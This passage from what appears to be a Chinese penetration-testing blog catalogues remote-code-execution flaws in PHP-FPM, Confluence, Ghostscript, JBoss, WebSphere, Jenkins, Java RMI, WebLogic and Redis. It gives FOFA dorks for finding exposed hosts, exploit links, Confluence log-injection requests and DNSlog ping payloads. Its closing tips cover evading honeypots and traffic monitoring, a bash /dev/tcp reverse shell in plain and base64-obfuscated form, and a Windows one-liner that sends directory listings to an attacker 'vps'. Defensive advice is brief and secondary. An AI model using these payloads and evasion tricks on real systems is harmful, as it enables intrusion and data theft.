防护方法</strong></p><p>1.升级到最新版</p><p>2.屏蔽8009端口对外开放</p><h2 id="PHP-FPM-远程代码执行漏洞"><a href="#PHP-FPM-远程代码执行漏洞" class="headerlink" title="PHP-FPM 远程代码执行漏洞"></a>PHP-FPM 远程代码执行漏洞</h2><p><strong>1. 漏洞简介</strong></p><p>国外安全研究员 Andrew Danau在解决一道 CTF 题目时发现, 向目标服务器 URL 发送 %0a 符号时, 服务返回异常, 疑似存在漏洞</p><p>2019年10月23日, github公开漏洞相关的详情以及exp.当nginx配置不当时, 会导致php-fpm远程任意代码执行</p><p><strong>2. 影响组件</strong></p><p>Nginx + FPM + PHP7</p><p><strong>3. 漏洞指纹</strong></p><pre><code class="hljs ebnf"><span class="hljs-attribute">Nginx</span><span class="hljs-attribute">PHP</span><span class="hljs-attribute">nextcloud</span></code></pre><p><strong>4. Fofa Dork</strong></p><p><strong>5. 漏洞分析</strong></p><p>PHP-fpm 远程代码执行漏洞(CVE-2019-11043)分析<br><a href="https://paper.seebug.org/1063/" target="_blank" rel="noopener">https://paper.seebug.org/1063/</a></p><p><strong>6. 漏洞利用</strong></p><p>neex/phuip-fpizdam: Exploit for CVE-2019-11043<br><a href="https://github.com/neex/phuip-fpizdam" target="_blank" rel="noopener">https://github.com/neex/phuip-fpizdam</a></p><p>jas502n/CVE-2019-11043: php-fpm+Nginx RCE<br><a href="https://github.com/jas502n/CVE-2019-11043" target="_blank" rel="noopener">https://github.com/jas502n/CVE-2019-11043</a></p><p><strong>7. 利用技巧</strong></p><p>1.这个漏洞检测没有特别稳定的方案, 目前可以参考k8的检测方案, 通过递增发送payload检测服务器502</p><p>k8gege/CVE-2019-11043: Ladon POC Moudle CVE-2019-11043 (PHP-FPM + Ngnix)<br><a href="https://github.com/k8gege/CVE-2019-11043" target="_blank" rel="noopener">https://github.com/k8gege/CVE-2019-11043</a></p><p>2.Nextcloud 这个应用的默认配置就存在漏洞</p><p><strong>8. 防护方法</strong></p><p>1.升级到最新版php</p><p>2.修改nginx配置</p><h2 id="CVE-2019-3396-Confluence-Wiki-远程代码执行"><a href="#CVE-2019-3396-Confluence-Wiki-远程代码执行" class="headerlink" title="CVE-2019-3396 Confluence Wiki 远程代码执行"></a>CVE-2019-3396 Confluence Wiki 远程代码执行</h2><p><strong>1. 漏洞简介</strong></p><p>Confluence Wiki 是企业常用的 Wiki 平台, 其媒体插件存在一处远程代码执行</p><p><strong>2. 影响组件</strong></p><p>Confluence</p><p><strong>3. 漏洞指纹</strong></p><p>Confluence</p><p><strong>4. Fofa Dork</strong></p><pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"Confluence"</span></code></pre><p><strong>5. 漏洞分析</strong></p><p>Confluence 未授权 RCE (CVE-2019-3396) 漏洞分析<br><a href="https://paper.seebug.org/884/" target="_blank" rel="noopener">https://paper.seebug.org/884/</a></p><p>Atlassian Confluence 远程代码执行漏洞分析 – 斗象能力中心</p><blockquote><p><a href="https://blog.riskivy.com/atlassian-confluence-rce-cve-2019-3396/" target="_blank" rel="noopener">Atlassian Confluence 远程代码执行漏洞分析</a></p></blockquote><p><strong>6. 漏洞利用</strong></p><p>jas502n/CVE-2019-3396: Confluence 未授权 RCE (CVE-2019-3396) 漏洞<br><a href="https://github.com/jas502n/CVE-2019-3396" target="_blank" rel="noopener">https://github.com/jas502n/CVE-2019-3396</a></p><p><strong>7. 利用技巧</strong></p><p>1.本地写日志的方式getshell</p><p>这个漏洞挺有意思的, 在国内没公开的时候, 我们就监测到了, 然后也写出了exp, 奈何没几天就曝光了</p><p>这里的远程模板加载不支持http协议, 主要是<code>classloader</code>的问题, 不然应该更早挖出来, 这里还有一种本地写日志的方式getshell</p><p>这是一个从来没有人关注的默认开放的8091端口, 部分低版本支持<code>file协议</code>可以getshell, 适用于不出网的情况, 这个poc不是特别稳定, 因为日志中有不可控的字符</p><p><code>velocity</code>比<code>php</code>语法要相对严格一点, 可能会报错, 而且<code>velocity</code>渲染的时候, 目标文件不能太大, 但是极端情况可以试一下</p><p>POC写入日志,分析一下挺简单的</p><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/synchrony/heartbeat</span> HTTP/1.1<span class="hljs-attribute">Host</span>: localhost:8091</code></pre><p>这里就使用file协议包含log文件就ok</p><pre><code class="hljs crystal">POST /rest/tinymce/<span class="hljs-number">1</span>/<span class="hljs-function"><span class="hljs-keyword">macro</span><span class="hljs-title">/</span></span>preview HTTP/<span class="hljs-number">1.1</span><span class="hljs-symbol">Host:</span> <span class="hljs-symbol">localhost:</span><span class="hljs-number">8090</span></code></pre><p><strong>8. 防护方法</strong></p><p>1.升级到最新版</p><p>2.尽量不要开放到公网</p><p>3.限制来源IP</p><h2 id="Ghostscript-上传图片代码执行"><a href="#Ghostscript-上传图片代码执行" class="headerlink" title="Ghostscript 上传图片代码执行"></a>Ghostscript 上传图片代码执行</h2><p><strong>1. 漏洞简介</strong></p><p>Ghostscript 是图像处理中十分常用的库, 集成在imagemagick等多个开源组件中, 其 .ps文件存在沙箱绕过导致代码执行的问题影响广泛, 由于上传图片就有可能代码执行, 很多大厂中招</p><p><strong>2. 影响组件</strong></p><p>imagemagick, libmagick, graphicsmagick, gimp, python-matplotlib, texlive-core, texmacs, latex2html, latex2rtf 等图像处理应用</p><p><strong>3. 漏洞指纹</strong></p><pre><code class="hljs asciidoc"><span class="hljs-title">.ps/.jpg/.png</span></code></pre><p><strong>4. Fofa Dork</strong></p><p><strong>5. 漏洞分析</strong></p><p>ghostscript命令执行漏洞预警 – 安全客, 安全资讯平台<br><a href="https://www.anquanke.com/post/id/157513" target="_blank" rel="noopener">https://www.anquanke.com/post/id/157513</a></p><p><strong>6. 漏洞利用</strong></p><p>Exploit Database Search<br><a href="https://www.exploit-db.com/search?q=Ghostscript" target="_blank" rel="noopener">https://www.exploit-db.com/search?q=Ghostscript</a></p><p>vulhub/ghostscript/CVE-2019-6116 at master · vulhub/vulhub<br><a href="https://github.com/vulhub/vulhub/tree/master/ghostscript/CVE-2019-6116" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/ghostscript/CVE-2019-6116</a></p><p><strong>7. 利用技巧</strong></p><p>1.如果发现网站可以上传图片, 且图片没有经过裁剪, 最后返回缩略图, 这里就可能存在Ghostscript 上传图片代码执行</p><p>dnslog 可以用 <code>ping</code>uname<code>.admin.ceye.io</code> 或 <code>ping</code>whoami<code>.admin.ceye.io</code></p><p>保存成图片, 以后用起来方便, 有个版本的 centos 和 ubuntu poc还不一样, 可以这样构造</p><pre><code class="hljs autohotkey">ping `whoami`.centos.admin.ceye.io` / `ping `whoami`.ubuntu.admin.ceye.io</code></pre><p>分别命名为 <code>centos_ps.jpg</code>/<code>ubuntu_ps.jpg</code>, 这样测试的时候直接传2个文件, 通过DNSLOG可以区分是哪个poc执行的</p><p><strong>8. 防护方法</strong></p><p>1.升级到最新版</p><h2 id="Jboss-相关漏洞"><a href="#Jboss-相关漏洞" class="headerlink" title="Jboss 相关漏洞"></a>Jboss 相关漏洞</h2><p><strong>1. 漏洞简介</strong></p><p>JBoss是一个基于J2EE的开放源代码应用服务器, 用户数量较大, 一些版本受到反序列化等漏洞影响</p><p><strong>2. 影响组件</strong></p><p>Jboss</p><p><strong>3. 漏洞指纹</strong></p><pre><code class="hljs ebnf"><span class="hljs-attribute">Jboss</span></code></pre><p><strong>4. Fofa Dork</strong></p><pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"JBoss"</span></code></pre><p><strong>5. 漏洞分析</strong></p><p>打开JBoss的潘多拉魔盒:JBoss高危漏洞分析 – FreeBuf互联网安全新媒体平台<br><a href="https://www.freebuf.com/vuls/186948.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/186948.html</a></p><p><strong>6. 漏洞利用</strong></p><p>joaomatosf/jexboss: JexBoss: Jboss (and Java Deserialization Vulnerabilities) verify and EXploitation Tool<br><a href="https://github.com/joaomatosf/jexboss" target="_blank" rel="noopener">https://github.com/joaomatosf/jexboss</a></p><p>Perun/vuln/jboss at master · WyAtu/Perun<br><a href="https://github.com/WyAtu/Perun/tree/master/vuln/jboss" target="_blank" rel="noopener">https://github.com/WyAtu/Perun/tree/master/vuln/jboss</a></p><p><strong>7. 利用技巧</strong></p><p>1.Jboss的漏洞在内网还是相对比较常见的, 试过几次<code>jexboss</code>, 效果还ok</p><p><strong>8. 防护方法</strong></p><p>1.设置强口令</p><p>2.尽量不要开放到公网</p><p>3.限制来源IP</p><p>4.升级到最新版</p><h2 id="Websphere-反序列化远程代码执行"><a href="#Websphere-反序列化远程代码执行" class="headerlink" title="Websphere 反序列化远程代码执行"></a>Websphere 反序列化远程代码执行</h2><p><strong>1. 漏洞简介</strong></p><p>Websphere 也是常见的java服务器, CVE-2015-7450(由于Comments Collections反序列化引起的, 应该是反序列化第一次被公众关注), 去年暴露了一个CVE-2019-4279(),</p><p>近期暴露了一个新的远程代码执行(CVE-2020-4276, CVE-2020-4362)</p><p><strong>2. 影响组件</strong></p><p>WebSphere</p><p><strong>3. 漏洞指纹</strong></p><pre><code class="hljs angelscript">WebSphere<span class="hljs-number">8880</span></code></pre><p><strong>4. Fofa Dork</strong></p><pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"IBM-WebSphere"</span></code></pre><p><strong>5. 漏洞分析</strong></p><p>What Do WebLogic, WebSphere, JBoss, Jenkins, OpenNMS, and Your Application Have in Common? This Vulnerability.<br><a href="https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/#websphere" target="_blank" rel="noopener">https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/#websphere</a></p><p>Websphere ND远程命令执行分析以及构造RpcServerDispatcher Payload(CVE-2019-4279) – 先知社区<br><a href="https://xz.aliyun.com/t/6394" target="_blank" rel="noopener">https://xz.aliyun.com/t/6394</a></p><p><strong>6. 漏洞利用</strong></p><p>java-deserialization-exploits/websphere_rce.py at master · Coalfire-Research/java-deserialization-exploits<br><a href="https://github.com/Coalfire-Research/java-deserialization-exploits/blob/master/WebSphere/websphere_rce.py" target="_blank" rel="noopener">https://github.com/Coalfire-Research/java-deserialization-exploits/blob/master/WebSphere/websphere_rce.py</a></p><p>Websphere ND远程命令执行分析以及构造RpcServerDispatcher Payload(CVE-2019-4279) – 先知社区<br><a href="https://xz.aliyun.com/t/6394" target="_blank" rel="noopener">https://xz.aliyun.com/t/6394</a></p><p><strong>7. 利用技巧</strong></p><p>1.Java 类的 web 容器 getshell 方法都差不多, 弱口令进后台部署 war, 或者反序列化, 文件上传之类的</p><p>Tomcat、Weblogic、JBoss、GlassFish、Resin、Websphere弱口令及拿webshell方法总结 – 先知社区<br><a href="https://xz.aliyun.com/t/309" target="_blank" rel="noopener">https://xz.aliyun.com/t/309</a></p><p><strong>8. 防护方法</strong></p><p>1.设置强口令</p><p>2.尽量不要开放到公网</p><p>3.限制来源IP</p><p>4.升级到最新版</p><h2 id="Jenkins-系列漏洞"><a href="#Jenkins-系列漏洞" class="headerlink" title="Jenkins 系列漏洞"></a>Jenkins 系列漏洞</h2><p><strong>1. 漏洞简介</strong></p><p>Jenkins 是常见的CI/CD服务器, 最常见的就是爆破弱口令然后使用groovy执行命令</p><p><strong>2. 影响组件</strong></p><p>Jenkins</p><p><strong>3. 漏洞指纹</strong></p><pre><code class="hljs ebnf"><span class="hljs-attribute">Jenkins</span></code></pre><p><strong>4. Fofa Dork</strong></p><pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"Jenkins"</span></code></pre><p><strong>5. 漏洞分析</strong></p><p>Jenkins RCE漏洞分析汇总<br><a href="http://www.lmxspace.com/2019/09/15/Jenkins-RCE漏洞分析汇总/?utm_source=tuicool&amp;utm_medium=referral#￦ﾀﾻ￧ﾻﾓ" target="_blank" rel="noopener">http://www.lmxspace.com/2019/09/15/Jenkins-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%B1%87%E6%80%BB/?utm_source=tuicool&amp;utm_medium=referral#￦ﾀﾻ￧ﾻﾓ</a></p><p>Jenkins漏洞集合复现 ~ Misaki’s Blog<br><a href="https://misakikata.github.io/2020/03/Jenkins漏洞集合复现/" target="_blank" rel="noopener">https://misakikata.github.io/2020/03/Jenkins%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88%E5%A4%8D%E7%8E%B0/</a></p><p><strong>6. 漏洞利用</strong></p><p>Jenkins漏洞集合复现 ~ Misaki’s Blog<br><a href="https://misakikata.github.io/2020/03/Jenkins漏洞集合复现/" target="_blank" rel="noopener">https://misakikata.github.io/2020/03/Jenkins%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88%E5%A4%8D%E7%8E%B0/</a></p><p>blackye/Jenkins: Jenkins漏洞探测、用户抓取爆破<br><a href="https://github.com/blackye/Jenkins" target="_blank" rel="noopener">https://github.com/blackye/Jenkins</a></p><p>gquere/pwn_jenkins: Notes about attacking Jenkins servers</p><p><a href="https://github.com/gquere/pwn_jenkins" target="_blank" rel="noopener">https://github.com/gquere/pwn_jenkins</a></p><p><strong>7. 利用技巧</strong></p><p>1.Jenkins 也是收集内网信息的好地方, 获取的账号通常也是开发/运维级别的, 权限相对较大</p><p><strong>8. 防护方法</strong></p><p>1.设置强口令</p><p>2.尽量不要开放到公网</p><p>3.限制来源IP</p><p>4.升级到最新版</p><h2 id="RMI-对外开放"><a href="#RMI-对外开放" class="headerlink" title="RMI 对外开放"></a>RMI 对外开放</h2><p><strong>1. 漏洞简介</strong></p><p>Java RMI, 即 远程方法调用(Remote Method Invocation), 一种用于实现远程过程调用(RPC)(Remote procedure call)的Java API, 能直接传输序列化后的Java对象和分布式垃圾收集</p><p>通常开放在1090 1099等端口, 由于直接传输java对象, 随意存在远程代码执行.</p><p><strong>2. 影响组件</strong></p><p>java*</p><p><strong>3. 漏洞指纹</strong></p><pre><code class="hljs angelscript"><span class="hljs-number">1098</span>, <span class="hljs-number">1099</span>, <span class="hljs-number">1090</span>, <span class="hljs-number">8901</span>, <span class="hljs-number">8902</span>, <span class="hljs-number">8903</span>N\x00rmiregistry</code></pre><p><strong>4. Fofa Dork</strong></p><pre><code class="hljs ini"><span class="hljs-attr">protocol</span>==<span class="hljs-string">"java-rmi"</span></code></pre><p><strong>5. 漏洞分析</strong></p><p>RMI-反序列化 – 先知社区<br><a href="https://xz.aliyun.com/t/6660" target="_blank" rel="noopener">https://xz.aliyun.com/t/6660</a></p><p><strong>6. 漏洞利用</strong></p><p>Jenkins漏洞集合复现 ~ Misaki’s Blog<br><a href="https://misakikata.github.io/2020/03/Jenkins%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88%E5%A4%8D%E7%8E%B0/" target="_blank" rel="noopener">https://misakikata.github.io/2020/03/Jenkins%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88%E5%A4%8D%E7%8E%B0/</a></p><p>Java RMI服务远程命令执行利用_91Ri.org<br><a href="http://www.91ri.org/15276.html" target="_blank" rel="noopener">http://www.91ri.org/15276.html</a></p><p><strong>7. 利用技巧</strong></p><p>1.rmi一般在内网开放的比较多, nmap 扫描如下</p><pre><code class="hljs angelscript">nmap -v <span class="hljs-number">8.8</span><span class="hljs-number">.8</span><span class="hljs-number">.8</span> -p1099 -sV --script=rmi*</code></pre><p><strong>8. 防护方法</strong></p><p>1.设置强口令</p><p>2.尽量不要开放到公网</p><p>3.限制来源IP</p><h2 id="Weblogic-T3-协议漏洞"><a href="#Weblogic-T3-协议漏洞" class="headerlink" title="Weblogic T3 协议漏洞"></a>Weblogic T3 协议漏洞</h2><p><strong>1. 漏洞简介</strong></p><p>Weblogic Server中的RMI 通信使用T3协议在Weblogic Server和其它Java程序（客户端或者其它Weblogic Server实例）之间传输数据, 服务器实例会跟踪连接到应用程序的每个Java虚拟机（JVM）中, 并创建T3协议通信连接, 将流量传输到Java虚拟机. T3协议在开放WebLogic控制台端口的应用上默认开启. 攻击者可以通过T3协议发送恶意的的反序列化数据, 进行反序列化, 实现对存在漏洞的weblogic组件的远程代码执行攻击.</p><p><strong>2. 影响组件</strong></p><p>Weblogic</p><p><strong>3. 漏洞指纹</strong></p><p>Lcom.tangosol.util.extractor.ReflectionExtractor</p><p>…</p><p><strong>4. Fofa Dork</strong></p><pre><code class="hljs ini"><span class="hljs-attr">protocol</span>==<span class="hljs-string">"weblogic"</span></code></pre><p><strong>5. 漏洞分析</strong></p><p>相关漏洞有:</p><p>CVE-2017-3248<br><a href="https://paper.seebug.org/333/" target="_blank" rel="noopener">https://paper.seebug.org/333/</a></p><p>CVE-2018-2628<br>[<a href="http://xxlegend.com/2018/04/18/CVE-2018-2628%20%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/]" target="_blank" rel="noopener">http://xxlegend.com/2018/04/18/CVE-2018-2628%20%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/]</a>(<a href="http://xxlegend.com/2018/04/18/CVE-2018-2628" target="_blank" rel="noopener">http://xxlegend.com/2018/04/18/CVE-2018-2628</a> 简单复现和分析/)</p><p>CVE-2018-2893<br><a href="https://www.freebuf.com/vuls/178105.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/178105.html</a></p><p>CVE-2019-2890<br><a href="https://paper.seebug.org/1069/" target="_blank" rel="noopener">https://paper.seebug.org/1069/</a></p><p>CVE-2020-2555(Oracle Coherence)<br><a href="https://paper.seebug.org/1141/" target="_blank" rel="noopener">https://paper.seebug.org/1141/</a></p><p>除此之外, 还有最近Oracle 2020年4月安全通告中的CVE-2020-2801, CVE-2020-2883, CVE-2020-2884, CVE-2020-2915(Oracle Coherence)等漏洞.<br><a href="https://www.oracle.com/security-alerts/cpuapr2020.html" target="_blank" rel="noopener">https://www.oracle.com/security-alerts/cpuapr2020.html</a></p><p><strong>6. 漏洞利用</strong></p><p>weblogic 漏洞扫描工具<br><a href="https://github.com/0xn0ne/weblogicScanner" target="_blank" rel="noopener">https://github.com/0xn0ne/weblogicScanner</a></p><p>CVE-2020-2555<br><a href="https://github.com/Y4er/CVE-2020-2555" target="_blank" rel="noopener">https://github.com/Y4er/CVE-2020-2555</a></p><p><strong>7. 利用技巧</strong></p><p>1.T3 协议通常开放在内网, 外网基本绝迹, 快速检测可以使用nmap</p><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> -sV --script=weblogic-t3-<span class="hljs-literal">info</span>.nse -p <span class="hljs-number">7001</span></code></pre><p>2.内网使用最新的利用链即可, weblogic也支持TLS加密的t3s, 可以使用</p><p>Bort-Millipede/WLT3Serial: Native Java-based deserialization exploit for WebLogic T3 (and T3S) listeners.<br><a href="https://github.com/Bort-Millipede/WLT3Serial" target="_blank" rel="noopener">https://github.com/Bort-Millipede/WLT3Serial</a></p><p><strong>8. 防护方法</strong></p><p>1.及时更新补丁<br>2.禁用T3协议<br>3.禁止T3端口对外开放, 或者限制可访问T3端口的IP来源</p><h2 id="Weblogic-XMLDecoder反序列化"><a href="#Weblogic-XMLDecoder反序列化" class="headerlink" title="Weblogic XMLDecoder反序列化"></a>Weblogic XMLDecoder反序列化</h2><p><strong>1. 漏洞简介</strong></p><p>2017年4月Oacle官方安全通告, 包含了对与CVE编号CVE-2017-3506的修复补丁, wls-wsat这个提供的web service服务中, 处理xml数据的的时候, XMLDecoder的反序列化漏洞风险, 同年10月份的补丁中的则是对其绕过的修复, CVE编号为CVE-2017-10271.</p><p>2019年4月17日, CNVD 发布《关于Oracle WebLogic wls9-async组件存在反序列化远程命令执行漏洞的安全公告》, 部分版本WebLogic中默认包含的wls9_async_response包, 为WebLogic Server提供异步通讯服务.由于该WAR包在反序列化处理输入信息时存在缺陷, 攻击者可以发送精心构造的恶意 HTTP 请求, 获得目标服务器的权限, 在未授权的情况下远程执行命令.</p><p><strong>2. 影响组件</strong></p><p>WebLogic 10.X</p><p>WebLogic 12.1.3</p><p><strong>3. 漏洞指纹</strong></p><pre><code class="hljs autohotkey">/wls-wsat/CoordinatorPortType``/_async/AsyncResponseService``/_async/AsyncResponseServiceSoap12</code></pre><p><strong>4. Fofa Dork</strong></p><pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"WebLogic-Server"</span></code></pre><p><strong>5. 漏洞分析</strong></p><p>（CVE-2017-3506 &amp;CVE-2017-10271）<br>[<a href="http://xxlegend.com/2017/12/23/Weblogic%20XMLDecoder%20RCE%E5%88%86%E6%9E%90/]" target="_blank" rel="noopener">http://xxlegend.com/2017/12/23/Weblogic%20XMLDecoder%20RCE%E5%88%86%E6%9E%90/]</a>(<a href="http://xxlegend.com/2017/12/23/Weblogic" target="_blank" rel="noopener">http://xxlegend.com/2017/12/23/Weblogic</a> XMLDecoder RCE分析/)</p><p>CVE-2019-2725<br><a href="https://paper.seebug.org/909/" target="_blank" rel="noopener">https://paper.seebug.org/909/</a></p><p><strong>6. 漏洞利用</strong><br>weblogicScanner<br><a href="https://github.com/0xn0ne/weblogicScanner" target="_blank" rel="noopener">https://github.com/0xn0ne/weblogicScanner</a></p><p><strong>7. 利用技巧</strong></p><p>1.由于nginx转发问题, 尝试这种路径, 可能有惊喜</p><pre><code class="hljs autohotkey">/../wls-wsat/CoordinatorPortType11``/../_async/AsyncResponseService</code></pre><p>2.Weblogic 写shell有个技巧</p><p>可以通过<code>find</code>/<code>grep</code>命令查找静态文件的路径, 然后将命令结果输出到静态文件夹中, 比如查找前台的<code>logo.png</code> / <code>/static/css/main.css</code></p><p><strong>8. 防护方法</strong></p><p>1.通过访问策略控制禁止外部/_async/* 及 /wls-wsat/*路径的URL访问；</p><p>2.删除对应war包并重启 webLogic；</p><p>3.限制源IP对应 weblogic 7001端口的访问.</p><h2 id="Weblogic-IIOP"><a href="#Weblogic-IIOP" class="headerlink" title="Weblogic IIOP"></a>Weblogic IIOP</h2><p><strong>1. 漏洞简介</strong></p><p>2017年4月Oacle官方安全通告中, 包含了对与CVE编号CVE-2020-2551的补丁, 未经身份验证的攻击者可以通过IIOP对Oracle WebLogic Server进行攻击, 造成远程代码执行.</p><p><strong>2. 影响组件</strong></p><p>Oracle WebLogic Server version:</p><p>10.3.6.0.0</p><p>12.1.3.0.0</p><p>12.2.1.3.0 and 12.2.1.4.0</p><p><strong>3. 漏洞指纹</strong></p><pre><code class="hljs css"><span class="hljs-selector-tag">GIOP</span> &amp;&amp; <span class="hljs-selector-tag">com</span><span class="hljs-selector-class">.bea</span><span class="hljs-selector-class">.core</span><span class="hljs-selector-class">.repackaged</span><span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.transaction</span><span class="hljs-selector-class">.jta</span><span class="hljs-selector-class">.JtaTransactionManager</span></code></pre><p><strong>4. Fofa Dork</strong></p><pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"WebLogic-Server"</span></code></pre><p><strong>5. 漏洞分析</strong></p><p>WebLogic CVE-2020-2551漏洞分析<br><a href="https://paper.seebug.org/1138/" target="_blank" rel="noopener">https://paper.seebug.org/1138/</a></p><p><strong>6. 漏洞利用</strong></p><p>Y4er/CVE-2020-2551: Weblogic IIOP CVE-2020-2551<br><a href="https://github.com/Y4er/CVE-2020-2551" target="_blank" rel="noopener">https://github.com/Y4er/CVE-2020-2551</a></p><p><strong>7. 利用技巧</strong></p><p>漫谈WebLogic CVE-2020-2551 – 安全客，安全资讯平台<br><a href="https://www.anquanke.com/post/id/201005" target="_blank" rel="noopener">https://www.anquanke.com/post/id/201005</a></p><p><strong>8. 防护方法</strong></p><p>1.及时更新补丁</p><p>2.通过 Weblogic 控制台进行关闭 IIOP 协议</p><h2 id="Redis-相关漏洞"><a href="#Redis-相关漏洞" class="headerlink" title="Redis 相关漏洞"></a>Redis 相关漏洞</h2><p><strong>1. 漏洞简介</strong></p><p>Redis 在近几年也是攻击的重点, 早期Redis默认没有密码, 且经常开放到公网, Redis可以进行文件写入, 以及后面的主从复制远程代码执行漏洞, 或者配合缓存序列化数据进行操作</p><p><strong>2. 影响组件</strong></p><p>Redis</p><p><strong>3. 漏洞指纹</strong></p><pre><code class="hljs angelscript"><span class="hljs-number">6379</span></code></pre><p><strong>4. Fofa Dork</strong></p><pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"Redis"</span> &amp;&amp; <span class="hljs-string">"redis_version"</span></code></pre><p><strong>5. 漏洞分析</strong></p><p>Redis 基于主从复制的 RCE 利用方式<br><a href="https://paper.seebug.org/975/" target="_blank" rel="noopener">https://paper.seebug.org/975/</a></p><p><strong>6. 漏洞利用</strong></p><p>n0b0dyCN/RedisModules-ExecuteCommand: Tools, utilities and scripts to help you write redis modules!<br><a href="https://github.com/n0b0dyCN/RedisModules-ExecuteCommand" target="_blank" rel="noopener">https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</a></p><p><strong>7. 利用技巧</strong></p><p>1.当Redis 权限满足写文件时</p><p>linux 写计划任务, windows写启动目录, 如果可以都写web目录的webshell</p><p>2.当Redis 权限不满足写文件时</p><p>发现Redis记录中存在JSON串的时候, 可以尝试写入Fastjson或Jackson的反序列化漏洞</p><p>发现Redis记录中存在<code>AC ED</code>这种反序列化特征的时候, 可以尝试写入ysoserial产生的序列化数据</p><p><strong>8. 防护方法</strong></p><p>1.Redis 设置强口令</p><p>2.Redis 尽量不要开放到公网</p><p>3.限制来源IP</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>1.记得躲避蜜罐, 现在身份识别蜜罐基本都是使用jsonp进行互联网身份识别, 随便抽一个蜜罐, 公网大概一百多台</p><p>搜索结果 – FOFA网络空间测绘系统<br><a href="https://fofa.so/result?q=" target="_blank" rel="noopener" var+jtoken%3d'"&qbase64="InZhciBqdG9rZW49JyI%3D&quot;">https://fofa.so/result?q=%22var+jtoken%3D%27%22&amp;qbase64=InZhciBqdG9rZW49JyI%3D</a></p><p>2.反弹shell 可以使用openssl反弹443端口, 现在厂商一般都有流量监控设备, 直接明文传输会被审查到</p><p>Reverse shell cheatsheet 多种反弹shell的命令<br><a href="https://krober.biz/misc/reverse_shell.php" target="_blank" rel="noopener">https://krober.biz/misc/reverse_shell.php</a></p><p>3.很多时候执行命令不能有特殊符号, 比如尖角号之类的, 可以使用 base64进行传参</p><pre><code class="hljs angelscript">bash -i &gt;&amp; /dev/tcp/<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/<span class="hljs-number">1337</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span></code></pre><p>base64 可以转换成</p><pre><code class="hljs plain">YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvMTMzNyAwPiYx</code></pre><p>最终可以变成</p><pre><code class="hljs dust"><span class="xml">bash -c "</span><span class="hljs-template-variable">{echo, YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvMTMzNyAwPiYx}</span><span class="xml">|</span><span class="hljs-template-variable">{base64, -d}</span><span class="xml">|</span><span class="hljs-template-variable">{bash, -i}</span><span class="xml">"</span></code></pre><p>4.windows机器可以使用ie浏览器带数据出来, 很多杀软不会拦截ie浏览器, unc 传输文件也可以</p><pre><code class="hljs ruby"><span class="hljs-keyword">for</span> /f %s <span class="hljs-keyword">in</span> (<span class="hljs-string">'dir c:\ /b'</span>) <span class="hljs-keyword">do</span> explorer <span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/vps:8000/</span><span class="hljs-string">?%</span>s\\vps\share\shell.bat</code></pre><p>5.针对很多时候java类漏洞, 比如反序列化, rmi, jmx, iiop等情况, 时常会遇到timeout的情况</p><p>这里主要是没有指定<code>hostname</code>, 这里可以使用<code>socat</code>进行流量转发, 无需修改POC, 以<code>CVE-2019-12409</code>为例</p><blockquote><p>这里针对 ENABLE_REMOTE_JMX_OPTS 远程代码执行(CVE-2019-12409) 多说一点, 因为这个问题在所有的jmx连接中都有可能出现<br>这里存在一个问题, JMX Server如果在启动时没有指明hostname, 那么在客户端与服务器交互过程中, 有一步返回 stub rmiserver的过程, 其中地址可能为内网地址<br>通过查看报错, 可以得知内网地址, 例如 172.18.0.2<br>使用如下两条命令即可执行, 替换 <code>[报错中的ip]</code>, <code>[远程目标的ip]</code></p></blockquote><pre><code class="hljs armasm"><span class="hljs-symbol">ip</span> <span class="hljs-keyword">addr </span><span class="hljs-keyword">add </span>[报错中的<span class="hljs-built_in">ip</span>]/<span class="hljs-number">24</span> dev lo<span class="hljs-symbol">socat</span> tcp4-listen:<span class="hljs-number">18983</span>, <span class="hljs-keyword">bind=[报错中的ip], </span>reuseaddr, fork tcp4-connect:[远程目标的<span class="hljs-built_in">ip</span>]:<span class="hljs-number">18983</span></code></pre><p>6.Java 反序列化是这两年的重中之重, 如果有shell出不来可以参考以下链接</p><p>深入理解JAVA反序列化漏洞 | 漏洞盒子 | 互联网安全测试众测平台<br><a href="https://www.vulbox.com/knowledge/detail/?id=11" target="_blank" rel="noopener">https://www.vulbox.com/knowledge/detail/?id=11</a></p><p>tomcat不出网回显连续剧第六集 – 先知社区<br><a href="https://xz.aliyun.com/t/7535" target="_blank" rel="noopener">https://xz.aliyun.com/t/7535</a></p><p>Weblogic T3/iiop 构造有回显exp方案分析 – 先知社区<br><a href="https://xz.aliyun.com/t/7489" target="_blank" rel="noopener">https://xz.aliyun.com/t/7489</a></p><p>weblogic IIOP漏洞的回显构造研究 – 先知社区<br><a href="https://xz.aliyun.com/t/7393" target="_blank" 